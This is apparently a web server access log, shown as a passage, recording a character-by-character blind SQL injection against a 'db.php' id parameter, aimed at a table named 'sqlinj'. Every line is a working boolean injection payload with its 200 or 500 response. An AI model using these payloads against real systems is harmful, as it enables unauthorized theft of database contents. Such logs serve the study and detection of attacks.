500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>68 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>70 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),4,1))>71 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>124 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>122 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),5,1))>123 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>88 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>82 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),6,1))>83 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>88 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>84 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>82 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),7,1))>81 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>80 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>76 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>74 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),8,1))>75 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>80 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>88 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>92 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),9,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>80 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>76 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>74 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),10,1))>73 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),11,1))>109 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>106 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),12,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>102 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),13,1))>101 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>100 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>98 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),14,1))>99 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>116 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>114 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),15,1))>115 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>106 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),16,1))>105 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>110 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),17,1))>111 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),18,1))>109 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),19,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>80 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>76 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>74 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),20,1))>73 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>120 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>116 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>114 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),21,1))>115 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),22,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>68 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>66 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),23,1))>67 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>98 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),24,1))>97 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>108 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),25,1))>109 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>100 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>102 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),26,1))>103 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),27,1))>100 HTTP/1.1
